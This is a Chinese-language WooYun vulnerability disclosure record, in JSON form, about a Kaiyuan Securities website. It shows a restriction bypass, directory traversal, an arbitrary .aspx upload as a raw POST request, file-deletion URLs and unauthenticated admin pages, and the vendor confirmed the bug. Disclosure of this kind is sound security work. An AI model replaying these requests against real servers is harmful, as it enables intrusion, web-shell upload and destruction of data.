{"id": 85088, "wybug_id": "wooyun-2016-0171468", "wybug_title": "简单绕过限制可继续shell开源证劵某站（任意文件上传\\目录遍历\\文件删除）", "wybug_corp": "开源证券股份有限公司", "wybug_author": "路人甲", "wybug_date": "2016-01-20 20:27", "wybug_open_date": "2016-03-05 09:52", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-01-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-01-21：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-01-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-02-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-02-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-03-05：\t细节向公众公开  简要描述： 简单绕过限制继续对开源证券某站执行（任意文件上传\\目录遍历\\文件删除）求20rank 详细说明：   WooYun: 开源证券主站存在任意文件上传\\目录遍历\\文件删除漏洞 简单看了下，在访问http://www.kysec.cn/qk/tools/Main.aspx页面时\n\n其实已经服务端已经把请求结果返回了\n\n这时候只需要F12禁用脚本即可\n\n继续遍历\n\nhttp://www.kysec.cn/qk/tools/main.aspx?path=/../\n\n\n\n   漏洞证明：  文件上传\nPOST http://www.kysec.cn/qk/tools/Main.aspx?act=upload&path=/../ HTTP/1.1Accept: text/html, application/xhtml+xml, */*Referer: http://www.kysec.cn/qk/tools/main.aspxAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Content-Type: multipart/form-data; boundary=---------------------------7df373a190f2eUA-CPU: AMD64Accept-Encoding: gzip, deflateConnection: Keep-AliveContent-Length: 340Host: www.kysec.cnPragma: no-cacheCookie: ASP.NET_SessionId=puigaa453f0fbnijb2j4iwrs; IESESSION=alive; CheckCode=49189; Hm_lvt_3769cd6b3049c7525de0689b8999d647=1449191375; Hm_lpvt_3769cd6b3049c7525de0689b8999d647=1449191375; Hm_lvt_23d8bc8b6e07fd4ea07b6ec4e368508e=1449191375; Hm_lpvt_23d8bc8b6e07fd4ea07b6ec4e368508e=1449191375; pgv_pvi=3243404288; pgv_si=s9492864000-----------------------------7df373a190f2eContent-Disposition: form-data; name=\"fileUpload\"; filename=\"C:\\Users\\Administrator\\Desktop\\wooyun.jpg\"Content-Type: image/pjpegtest-----------------------------7df373a190f2eContent-Disposition: form-data; name=\"btnUpload\"添加-----------------------------7df373a190f2e--\n\n\n重命名后http://www.kysec.cn/qk/20161201853725.aspx\n\n删除文件http://www.kysec.cn/qk/tools/Main.aspx?act=delete&path=/../&file=20161201853725.aspx&type=filehttp://www.kysec.cn/qk/tools/Main.aspx?act=delete&path=/../&file=20161201854131.jpg&type=file访问即删\n\n其实还可以这样，利用遍历，我们直接访问管理页面http://www.kysec.cn/qk/admin/rapidset/shortcut.aspxhttp://www.kysec.cn/qk/admin/rapidset/adminuser.aspxhttp://www.kysec.cn/qk/admin/rapidset/managemainmenu.aspx\n\n\n\n\n\n   修复方案：  权限控制   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2016-01-21 08:56 厂商回复： 确认漏洞存在，感谢@路人甲 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}